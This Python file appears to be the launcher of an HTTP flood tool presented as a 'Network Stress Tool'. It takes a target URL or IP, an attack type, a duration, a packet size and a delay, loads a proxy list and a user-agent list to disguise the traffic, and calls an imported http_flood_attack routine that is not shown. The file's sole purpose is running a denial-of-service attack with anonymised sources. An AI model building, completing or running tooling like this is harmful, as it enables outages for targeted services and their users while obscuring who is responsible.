import argparse
from pystyle import Colorate, Colors
from banner import sharkprint
from utils.proxy_utils import load_proxies
from workers.http_flood_attack import http_flood_attack

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

def load_user_agents(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

def main():
    print(Colorate.Horizontal(Colors.blue_to_white, (sharkprint)))
    parser = argparse.ArgumentParser(description="Network Stress Tool")
    parser.add_argument("target", help="Target URL or IP:Port")
    parser.add_argument("--attack", choices=["http_flood"], required=True, help="Type of attack")
    parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")
    parser.add_argument("--packet-size", type=int, default=64, help="Packet size in KB (default: 64)")
    parser.add_argument("--packet-delay", type=int, default=100, help="Delay between packets in milliseconds (default: 100)")
    args = parser.parse_args()

    proxies = load_proxies("data/proxies.txt")
    user_agents = load_user_agents("data/uas.txt")

    if args.attack == "http_flood":
        http_flood_attack(args.target, proxies, user_agents, args.duration, args.packet_size, args.packet_delay)

if __name__ == "__main__":
    main()
